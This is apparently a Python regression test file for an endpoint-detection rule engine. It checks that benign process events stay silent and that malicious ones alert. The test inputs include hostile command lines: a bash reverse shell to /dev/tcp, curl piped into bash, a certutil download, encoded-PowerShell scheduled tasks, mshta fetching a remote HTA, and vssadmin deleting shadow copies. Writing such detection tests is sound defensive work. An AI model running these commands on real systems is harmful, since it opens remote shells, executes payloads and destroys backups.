"""Regressioni dalla simulazione profonda 4.3.

Coprono i falsi positivi e il 422 trovati inviando eventi reali allo stack:
- liste oltre il limite (600 processi) devono essere troncate, non rifiutate;
- interpreti Linux su path standard senza contesto sospetto non allertano;
- `curl`/`wget` con un URL normale non sono abuso di LOLBin;
- `schtasks /change` senza cambio d'azione non e' persistenza;
- `vssadmin list shadows` non e' un credential dumper, `delete shadows` si'.
"""
from datetime import datetime, timezone

from app.api.schemas.common import EventSchema
from app.rules.rule_definitions import (
    rule_known_attack_tool,
    rule_lolbin_usage,
    rule_recovery_destruction,
    rule_scheduled_task_creation,
    rule_script_interpreter_abuse,
    rule_suspicious_parent_child,
)


def ev(**kwargs) -> EventSchema:
    base = {
        "agent_id": "test-agent",
        "timestamp": datetime.now(timezone.utc),
        "event_type": "PROCESS_CREATED",
        "process_name": "unknown.exe",
    }
    base.update(kwargs)
    return EventSchema(**base)


def test_schema_clamps_processes_instead_of_rejecting():
    schema = ev(processes=[{"name": f"p{i}.exe", "pid": i} for i in range(600)])
    assert len(schema.processes) == 500
    assert "truncated" in (schema.quality or "")


def test_schema_clamps_loaded_modules():
    schema = ev(loaded_modules=[f"m{i}.dll" for i in range(300)])
    assert len(schema.loaded_modules) == 256


def test_linux_interpreter_on_system_path_without_context_is_silent():
    result = rule_script_interpreter_abuse(ev(
        process_name="bash", process_path="/usr/bin/bash",
        command_line="bash -c ls -la /var/log"))
    assert result.triggered is False


def test_linux_reverse_shell_still_alerts():
    result = rule_script_interpreter_abuse(ev(
        process_name="bash", process_path="/bin/bash",
        command_line="bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"))
    assert result.triggered is True


def test_interpreter_outside_standard_path_alerts():
    result = rule_script_interpreter_abuse(ev(
        process_name="bash", process_path="/tmp/.hidden/bash",
        command_line="bash"))
    assert result.triggered is True


def test_curl_https_is_not_lolbin_abuse():
    result = rule_lolbin_usage(ev(
        process_name="curl", process_path="/usr/bin/curl",
        command_line="curl -s https://example.com/health"))
    assert result.triggered is False


def test_curl_pipe_to_shell_is_lolbin_abuse():
    result = rule_lolbin_usage(ev(
        process_name="curl", process_path="/usr/bin/curl",
        command_line="curl -s http://203.0.113.9/i.sh | bash"))
    assert result.triggered is True


def test_certutil_urlcache_still_alerts():
    result = rule_lolbin_usage(ev(
        process_name="certutil.exe",
        process_path=r"C:\Windows\System32\certutil.exe",
        command_line="certutil.exe -urlcache -f http://203.0.113.9/a.exe C:\\Temp\\a.exe"))
    assert result.triggered is True


def test_schtasks_change_without_action_is_silent():
    result = rule_scheduled_task_creation(ev(
        process_name="schtasks.exe",
        process_path=r"C:\Windows\System32\schtasks.exe",
        command_line=r"schtasks.exe /change /tn \Microsoft\Windows\Defrag\ScheduledDefrag /disable"))
    assert result.triggered is False


def test_schtasks_change_action_alerts():
    result = rule_scheduled_task_creation(ev(
        process_name="schtasks.exe",
        process_path=r"C:\Windows\System32\schtasks.exe",
        command_line='schtasks.exe /change /tn Updater /tr "powershell -enc AAAA"'))
    assert result.triggered is True


def test_schtasks_create_alerts():
    result = rule_scheduled_task_creation(ev(
        process_name="schtasks.exe",
        process_path=r"C:\Windows\System32\schtasks.exe",
        command_line=r'schtasks.exe /create /tn Backup /tr "C:\App\backup.exe" /sc daily'))
    assert result.triggered is True


def test_vssadmin_list_is_not_an_attack_tool():
    result = rule_known_attack_tool(ev(
        process_name="vssadmin.exe",
        process_path=r"C:\Windows\System32\vssadmin.exe",
        command_line="vssadmin.exe list shadows"))
    assert result.triggered is False


def test_vssadmin_delete_shadows_is_recovery_destruction():
    result = rule_recovery_destruction(ev(
        process_name="vssadmin.exe",
        process_path=r"C:\Windows\System32\vssadmin.exe",
        command_line="vssadmin.exe delete shadows /all /quiet"))
    assert result.triggered is True


def test_explorer_spawning_cmd_is_not_suspicious_lineage():
    """Win+R, shortcut e script di login: flusso admin normale (FP misurato)."""
    result = rule_suspicious_parent_child(ev(
        parent_process_name="explorer.exe", process_name="cmd.exe",
        process_path=r"C:\Windows\System32\cmd.exe",
        command_line="cmd.exe /c dir C:\\Users\\Public"))
    assert result.triggered is False


def test_explorer_spawning_mshta_still_alerts():
    result = rule_suspicious_parent_child(ev(
        parent_process_name="explorer.exe", process_name="mshta.exe",
        process_path=r"C:\Windows\System32\mshta.exe",
        command_line="mshta.exe http://203.0.113.9/a.hta"))
    assert result.triggered is True
